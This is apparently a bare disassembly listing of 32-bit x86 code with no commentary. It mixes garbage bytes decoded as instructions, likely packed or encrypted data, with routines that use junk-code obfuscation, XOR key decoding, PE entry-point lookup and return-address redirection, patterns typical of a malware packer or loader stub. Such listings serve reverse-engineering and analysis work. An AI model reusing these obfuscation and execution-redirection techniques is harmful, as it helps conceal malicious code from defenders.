  406188:	mov    esi,0xa83b76ae
  40618d:	pop    ebx
  40618e:	gs repnz or eax,0x54cf06a7
  406195:	inc    ecx
  406196:	cli    
  406197:	rep outs dx,BYTE PTR ds:[esi]
  406199:	mov    edi,0x7bc0f3d9
  40619e:	sahf   
  40619f:	push   es
  4061a0:	aaa    
  4061a1:	in     eax,dx
  4061a2:	fcom   DWORD PTR [eax]
  4061a4:	ret    
  4061a5:	cmp    ah,BYTE PTR [esi-0x24]
  4061a8:	add    DWORD PTR [edi],0xffffffc1
  4061ab:	stos   DWORD PTR es:[edi],eax
  4061ac:	push   ds
  4061ad:	mov    dh,0xc
  4061af:	in     eax,dx
  4061b0:	pop    esp
  4061b1:	test   al,0x45
  4061b3:	fst    DWORD PTR [si-0x5ff0]
  4061b8:	ins    BYTE PTR es:[edi],dx
  4061b9:	push   ss
  4061ba:	pushf  
  4061bb:	stc    
  4061bc:	and    DWORD PTR [ebx+eax*1-0x49],ebp
  4061c0:	inc    DWORD PTR [ebx]
  4061c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061c3:	fdivrp st(0),st
  4061c5:	add    DWORD PTR [ebp+0x41],ecx
  4061c8:	popa   
  4061c9:	mov    bl,0x3e
  4061cb:	xchg   DWORD PTR [eax],esp
  4061cd:	and    eax,0xba5950af
  4061d2:	out    0x3c,al
  4061d4:	xchg   esp,ebx
  4061d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061d7:	shl    DWORD PTR [edi-0xfe44917],cl
  4061dd:	mul    BYTE PTR [esi]
  4061df:	and    DWORD PTR ds:0xb5993206,edi
  4061e5:	xchg   edi,eax
  4061e6:	jmp    0xce84326e
  4061eb:	int3   
  4061ec:	mov    bl,0xc9
  4061ee:	sub    ch,ch
  4061f0:	daa    
  4061f1:	scas   al,BYTE PTR es:[edi]
  4061f2:	std    
  4061f3:	outs   dx,BYTE PTR ds:[esi]
  4061f4:	and    al,0x56
  4061f6:	add    bl,BYTE PTR [esi-0xf]
  4061f9:	and    DWORD PTR [ecx],esi
  4061fb:	jl     0x4061e8
  4061fd:	sbb    al,0x8d
  4061ff:	pusha  
  406200:	mov    ebp,0xdc527a98
  406205:	jp     0x4061ac
  406207:	push   edx
  406208:	sbb    ah,ah
  40620a:	iret   
  40620b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40620c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40620d:	std    
  40620e:	ds mov edx,0xcc595d19
  406214:	mov    bl,0x17
  406216:	pop    esi
  406217:	jns    0x406271
  406219:	lock push eax
  40621b:	in     eax,0x9a
  40621d:	inc    ebp
  40621e:	mov    eax,ds:0x2899026b
  406223:	call   FWORD PTR [ecx-0x54]
  406226:	shr    BYTE PTR [ebp+0x8d1faf7],cl
  40622c:	xchg   ecx,eax
  40622d:	pop    edx
  40622e:	sbb    DWORD PTR [eax-0x6e1ae950],ebx
  406234:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406235:	jle    0x406219
  406237:	mov    ebp,0x6cef999
  40623c:	inc    BYTE PTR [ecx-0x30de4db6]
  406242:	(bad)  
  406243:	dec    eax
  406244:	pop    edi
  406245:	sti    
  406246:	mov    ecx,0x2fd3e074
  40624b:	pop    esi
  40624c:	sti    
  40624d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40624e:	dec    esp
  40624f:	mov    al,0x34
  406251:	pop    edx
  406252:	and    BYTE PTR [edi],cl
  406254:	out    dx,eax
  406255:	outs   dx,BYTE PTR ds:[esi]
  406256:	cs retf 
  406258:	push   edi
  406259:	inc    BYTE PTR [ebp+edx*4+0x106d2bb]
  406260:	fsub   st,st(3)
  406262:	dec    esp
  406263:	push   ebx
  406264:	xor    esi,eax
  406266:	and    DWORD PTR ds:0x4338a3,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x4338a3
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x4338a3,ecx
  406282:	cmp    DWORD PTR ds:0x4338a3,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x4338a3,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x4338a3,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x4338a3
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x4338a3,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	pop    ebp
  406312:	or     DWORD PTR [edx+0x7e3f54c1],0x7e
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	mov    WORD PTR [edi-0x75],?
  406320:	pop    ds
  406321:	or     DWORD PTR [ebx+0x6ffd6eb6],esp
  406327:	outs   dx,DWORD PTR ds:[esi]
  406328:	jecxz  0x4062f1
  40632a:	jns    0x406338
  40632c:	scas   al,BYTE PTR es:[edi]
  40632d:	sar    BYTE PTR ds:0x34a30e12,0x6
  406334:	sar    DWORD PTR [edx+0x60253b5d],cl
  40633a:	(bad)  
  40633b:	pusha  
  40633c:	out    dx,al
  40633d:	aad    0x9
  40633f:	mov    bl,0xd3
  406341:	dec    edx
  406342:	dec    edi
  406343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406344:	test   al,0x19
  406346:	jo     0x4062c9
  406348:	ret    0xb1d5
  40634b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40634c:	data16 jmp 0x40631b
  40634f:	dec    edi
  406350:	dec    ebx
  406351:	jmp    0xe37afd7e
  406356:	or     al,0x28
  406358:	aas    
  406359:	or     esi,DWORD PTR [ebp+0x76]
  40635c:	jae    0x40637c
  40635e:	fisttp QWORD PTR [ecx-0x188b1]
  406364:	imul   DWORD PTR [ecx+0x19]
  406367:	sbb    al,BYTE PTR [esi+0x1f]
  40636a:	jbe    0x4063e9
  40636c:	in     eax,0xeb
  40636e:	rcl    DWORD PTR [ecx-0x4419d62f],cl
  406374:	push   ebp
  406375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406377:	enter  0xdef0,0x1e
  40637b:	call   0xf76dbdb9
  406380:	cmp    ecx,ebx
  406382:	mov    ebx,0xb4e48434
  406387:	rcr    ebx,cl
  406389:	jg     0x406323
  40638b:	jmp    0x40636d
  40638d:	lahf   
  40638e:	sbb    DWORD PTR [edx+0x28],edi
  406391:	push   esp
  406392:	aam    0xce
  406394:	jb     0x4063d6
  406396:	cmp    al,0x80
  406398:	and    BYTE PTR [esp+esi*1],dl
  40639b:	xor    ah,BYTE PTR [edi-0x481311da]
  4063a1:	pop    ebp
  4063a2:	jmp    0x4063fd
  4063a4:	mov    al,ds:0x7dcdf043
  4063a9:	xchg   BYTE PTR [edx+0x3359a83],al
  4063af:	jp     0x4063f0
  4063b1:	xchg   edi,eax
  4063b2:	stc    
  4063b3:	(bad)  
  4063b5:	mov    BYTE PTR [ecx+0x46178d12],bl
  4063bb:	nop
  4063bc:	xor    al,0x45
  4063be:	rol    BYTE PTR [eax+ecx*8-0x3c],1
  4063c2:	xchg   ebp,eax
  4063c3:	push   0x2b128a3a
  4063c8:	pop    es
  4063c9:	fld    DWORD PTR [ecx-0x33ae060c]
  4063cf:	es and bh,ah
  4063d2:	sti    
  4063d3:	(bad)
  4063d7:	or     BYTE PTR [eax],al
  4063d9:	add    BYTE PTR [eax],dl
  4063db:	pop    ecx
  4063dc:	aad    0x8d
  4063de:	das    
  4063df:	shl    DWORD PTR [ebx],cl
  4063e1:	aas    
  4063e2:	shl    BYTE PTR [esi-0x663d5e08],1
  4063e8:	sub    eax,0xffffffa4
  4063eb:	sub    DWORD PTR [edi-0x5a],esi
  4063ee:	mov    ch,0x8d
  4063f0:	push   ss
  4063f1:	(bad)  
  4063f2:	xchg   edi,eax
  4063f3:	daa    
  4063f4:	ins    BYTE PTR es:[edi],dx
  4063f5:	xadd   BYTE PTR [esi],bl
  4063f8:	leave  
  4063f9:	cld    
  4063fa:	pop    bx
  4063fc:	js     0x406469
  4063fe:	daa    
  4063ff:	sub    al,0x38
  406401:	out    0x6c,eax
  406403:	jo     0x406432
  406405:	(bad)  
  406406:	sub    DWORD PTR [esi+edi*1-0x4b325f49],edx
  40640d:	xchg   esi,eax
  40640e:	jnp    0x4063c3
  406410:	push   esp
  406411:	jb     0x406442
  406413:	adc    al,0x58
  406415:	loopne 0x406425
  406417:	add    DWORD PTR [eax],edx
  406419:	arpl   WORD PTR [ebx+eiz*2+0x4d7b4ff0],dx
  406420:	sbb    al,0x95
  406422:	push   edi
  406423:	mov    BYTE PTR [edx-0x1668b45c],bh
  406429:	lock call 0x94bb2e24
  40642f:	mov    edx,DWORD PTR [ebx]
  406431:	popf   
  406432:	sub    BYTE PTR ds:0x3fea9cb9,dh
  406438:	pop    ds
  406439:	in     al,0x17
  40643b:	out    dx,al
  40643c:	(bad)  
  40643e:	mov    esi,0xd5263b23
  406443:	and    eax,0x15874557
  406448:	inc    esp
  406449:	jno    0x4064c0
  40644b:	xchg   ecx,eax
  40644c:	dec    eax
  40644d:	(bad)  
  40644e:	in     al,dx
  40644f:	xor    al,0xb4
  406451:	ror    DWORD PTR [ebx+ebx*2],1
  406454:	jmp    0xba5c:0x77a1c820
  40645b:	fcomi  st,st(0)
  40645d:	imul   ecx,DWORD PTR [ebx+0x49],0xffffffc6
  406461:	(bad)  
  406462:	test   al,0x9b
  406464:	cwde   
  406465:	inc    esp
  406466:	js     0x406425
  406468:	int3   
  406469:	mov    ds:0xca590623,eax
  40646e:	jp     0x40647e
  406470:	test   eax,0xc8728978
  406475:	retf   
  406476:	mov    ebx,0x54b45e06
  40647b:	and    edi,edi
  40647d:	sbb    edi,DWORD PTR [edi+0x27]
  406480:	dec    ebp
  406481:	push   ebx
  406482:	dec    edi
  406483:	jg     0x40647e
  406485:	mov    WORD PTR [esi],?
  406487:	rcl    DWORD PTR [eax+eax*4-0x2dab5adb],0xa4
  40648f:	repnz inc edi
  406491:	mov    ecx,0xd97e6f78
  406496:	outs   dx,DWORD PTR ds:[esi]
  406497:	xlat   BYTE PTR ds:[ebx]
  406498:	inc    esp
  406499:	clc    
  40649a:	ins    DWORD PTR es:[edi],dx
  40649b:	push   ss
  40649c:	fwait
  40649d:	cmp    al,0xd8
  40649f:	pop    DWORD PTR [ebx]
  4064a1:	and    esi,0xdc8f7e3
  4064a7:	rol    DWORD PTR [ebx+0x63],0xb4
  4064ab:	test   DWORD PTR [edx],eax
  4064ad:	jle    0x406467
  4064af:	jle    0x406435
  4064b1:	js     0x40643d
  4064b3:	mov    ebx,0xb265efc3
  4064b8:	pop    es
  4064b9:	jl     0x4064ff
  4064bb:	cdq    
  4064bc:	push   ecx
  4064bd:	mov    eax,ds:0xc2419de0
  4064c2:	pop    es
  4064c3:	shr    dh,0x55
  4064c6:	jno    0x4064d6
  4064c8:	sbb    BYTE PTR [edi],al
  4064ca:	xor    DWORD PTR [ebx+edi*4],esp
  4064cd:	jp     0x406499
  4064cf:	dec    ecx
  4064d0:	enter  0x1d18,0x61
  4064d4:	mov    edx,0xa18c2478
  4064d9:	push   ebp
  4064da:	sbb    BYTE PTR [eax-0x2e],0xa0
  4064de:	and    BYTE PTR [esp+ebp*4-0x3d],0x9c
  4064e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064e4:	lahf   
  4064e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064e6:	cdq    
  4064e7:	stos   BYTE PTR es:[edi],al
  4064e8:	(bad)  
  4064e9:	fidivr DWORD PTR [esi]
  4064eb:	lahf   
  4064ec:	pop    ss
  4064ed:	adc    edx,DWORD PTR [edi]
  4064ef:	fldenv [ebp+0x3bb55967]
  4064f5:	clc    
  4064f6:	lds    ebx,FWORD PTR ds:0xfe13a247
  4064fc:	fstp   QWORD PTR [ecx-0x9]
  4064ff:	pop    esp
  406500:	xor    BYTE PTR [ebx-0x5d],cl
  406503:	aaa    
  406504:	gs jle 0x406560
  406507:	loope  0x4064a1
  406509:	(bad)  
  40650a:	jns    0x4064ba
  40650c:	bound  ebx,QWORD PTR [esi]
  40650e:	add    DWORD PTR [edx+0x1ae07434],ecx
  406514:	mov    al,0x6a
  406516:	out    0xb9,eax
  406518:	mov    es,WORD PTR [ecx]
  40651a:	gs sbb eax,0x6a75c2bd
  406520:	push   edx
  406521:	dec    ecx
  406522:	pop    edx
  406523:	sub    al,0xc2
  406525:	call   0x926dede3
  40652a:	lock mov ds:0x7440c5c8,al
  406530:	lahf   
  406531:	inc    ebx
  406532:	fidiv  WORD PTR [ebp-0x5a]
  406535:	adc    dh,bh
  406537:	add    al,0xeb
  406539:	mov    ds:0x4b26b907,al
  40653e:	mov    al,ds:0xc8084809
  406543:	mov    bh,0x6b
  406545:	adc    al,0x50
  406547:	sar    esi,0xfe
  40654a:	and    al,0xdf
  40654c:	call   0xfef099b2
  406551:	and    ah,BYTE PTR [edi-0x25]
  406554:	std    
  406555:	pop    ecx
  406556:	int    0x6c
  406558:	enter  0xdd2e,0xd2
  40655c:	dec    edi
  40655d:	xor    esp,DWORD PTR [edx-0x47]
  406560:	xchg   edi,eax
  406561:	ret    
  406562:	pop    eax
  406563:	ret    
  406564:	inc    edi
  406565:	inc    ebx
  406566:	fucom  st(4)
  406568:	add    al,0x5c
  40656a:	xor    DWORD PTR [ebp+0x5b],esi
  40656d:	rcl    bh,0xab
  406570:	push   esp
  406571:	repz test bl,al
  406574:	jge    0x4065de
  406576:	shr    BYTE PTR [edi-0x64bb4713],cl
  40657c:	lods   eax,DWORD PTR ds:[esi]
  40657d:	ret    
  40657e:	sbb    al,0xb7
  406580:	mov    ds:0x22e964f4,eax
  406585:	cwde   
  406586:	gs xchg edi,eax
  406588:	aas    
  406589:	stos   BYTE PTR es:[edi],al
  40658a:	(bad)  
  40658b:	or     DWORD PTR [eax-0x12fd52ce],edx
  406591:	dec    esp
  406592:	(bad)  
  406594:	repnz pusha 
  406596:	lea    esp,ds:0xd5c80e57
  40659c:	dec    ecx
  40659d:	out    dx,eax
  40659e:	das    
  40659f:	dec    ebp
  4065a0:	cmp    eax,0x8872d51f
  4065a5:	(bad)  
  4065a6:	outs   dx,DWORD PTR ds:[esi]
  4065a7:	pop    esi
  4065a8:	cmp    eax,DWORD PTR [edx]
  4065aa:	in     al,0x29
  4065ac:	xor    dl,BYTE PTR [edx-0x24]
  4065af:	xor    ebx,DWORD PTR ss:[edi+0x49]
  4065b3:	jns    0x406623
  4065b5:	pop    esi
  4065b6:	fcom   QWORD PTR [ebx+edi*8-0x2b8b8467]
  4065bd:	call   0x9e83fa88
  4065c2:	mov    ecx,0x775ebfa
  4065c7:	or     BYTE PTR [ebx-0x6f880a3b],bl
  4065cd:	retf   0xe49a
  4065d0:	xchg   BYTE PTR [ebp+0x3],bh
  4065d3:	(bad)  
  4065d4:	mov    al,ds:0x3446882b
  4065d9:	int    0x67
  4065db:	dec    esi
  4065dc:	mov    esp,0xbdf457f8
  4065e1:	test   eax,ebp
  4065e3:	test   eax,0x7cf33248
  4065e8:	push   ecx
  4065e9:	loope  0x4065f9
  4065eb:	or     al,0xb7
  4065ed:	adc    BYTE PTR [eax],bh
  4065ef:	or     ebp,DWORD PTR [ecx]
  4065f1:	jle    0x4065e6
  4065f3:	mov    cl,0x33
  4065f5:	add    DWORD PTR [ecx-0xbbf32fe],esp
  4065fb:	sbb    esp,DWORD PTR ds:0x4f0bf7c5
  406601:	daa    
  406602:	repz pop ecx
  406604:	sub    ch,dl
  406606:	ds mov cl,0xbf
  406609:	jecxz  0x4065a7
  40660b:	cmp    eax,0x4d7eb545
  406610:	(bad)  
  406611:	popa   
  406612:	call   0xebad:0xb5754cd9
  406619:	inc    ecx
  40661a:	fwait
  40661b:	pop    ds
  40661c:	xchg   esi,ebx
  40661e:	or     eax,0x62b0a13c
  406623:	leave  
  406624:	cld    
  406625:	hlt    
  406626:	dec    ebx
  406627:	aam    0xff
  406629:	and    al,0x6f
  40662b:	fild   QWORD PTR [ebx]
  40662d:	adc    eax,0x35021f3e
  406632:	sub    bh,al
  406634:	xor    al,0xc8
  406636:	sub    BYTE PTR [esi-0x1a],dh
  406639:	push   ds
  40663a:	push   esi
  40663b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40663c:	dec    esp
  40663d:	ins    BYTE PTR es:[edi],dx
  40663e:	adc    ebx,eax
  406640:	adc    eax,0xd8b3ade9
  406645:	mov    edi,0x5d5e496e
  40664a:	xchg   DWORD PTR [esi],eax
  40664c:	xor    eax,0xd0ff6df0
  406651:	jmp    0x406659
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x43377b,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x433853,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x433827,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x433863,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x433863
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x433863,ecx
  4066d8:	cmp    DWORD PTR ds:0x433863,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433983
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x433863,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x433863
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x433863,ecx
  406714:	cmp    DWORD PTR ds:0x433863,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x433857
  406728:	and    ecx,DWORD PTR ds:0x43378f
  40672e:	mov    DWORD PTR ds:0x433857,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43379b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x4338ab
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433793,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x4337eb,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433787,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433787
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433787,ebx
  40677d:	cmp    DWORD PTR ds:0x433787,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433787,0x23
  406791:	jne    0x4067a7
  406797:	push   0x4339b3
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x43382b,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433817,0x433827
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x433853
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x4337eb,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433793,0x43381f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433787,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x43382f
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x433863
  40683c:	and    DWORD PTR ds:0x433827,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x4338ab
  40684d:	or     DWORD PTR ds:0x433863,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x4337db,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43389f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x43382b
  406870:	sub    DWORD PTR ds:0x433853,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43378b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433787,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433793,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43378f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x4337a3,0x4338ab
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43381b,0x43385f
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x433867,0x433813
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x4337d3,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x4337db,0x43386f
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x43382b,0x4337ef
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x4337db,0x43381b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x43377b
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x43377b,0x4337a3
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x43385b
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x43377f,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x43386f,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43389b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43389b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43389b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43389b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43389b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433817
  4069db:	adc    ecx,DWORD PTR ds:0x4337df
  4069e1:	mov    DWORD PTR ds:0x433817,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
